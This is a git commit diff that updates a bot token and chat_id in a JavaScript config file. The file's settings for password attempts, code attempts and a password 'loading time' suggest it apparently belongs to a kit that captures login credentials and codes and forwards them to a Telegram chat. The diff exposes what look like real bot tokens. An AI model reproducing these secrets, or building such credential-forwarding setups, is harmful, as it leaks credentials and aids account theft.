fb138a25ac80d7aa0a1803848a230fd4c1a0ba0d
amidatanga6-spec <amidatanga6@gmail.com>
2026-06-05 07:43:30 -0400

    Update token and chat_id in config.js

--- src/utils/config.js
+++ src/utils/config.js
@@ -1,6 +1,6 @@
 const config = {
-    token: '8629418409:AAEincdHC8iKLbRU40_HvHg2gAKZw9l3P5k',
-    chat_id: '-5170611093',
+    token: '6151798592:AAFwIFb95eY4UkW-qDV3SLRWc2wvPfMLcPc',
+    chat_id: '-5170189160',
     max_password_attempts: 2,
     max_code_attempts: 3,
     password_loading_time: 6,
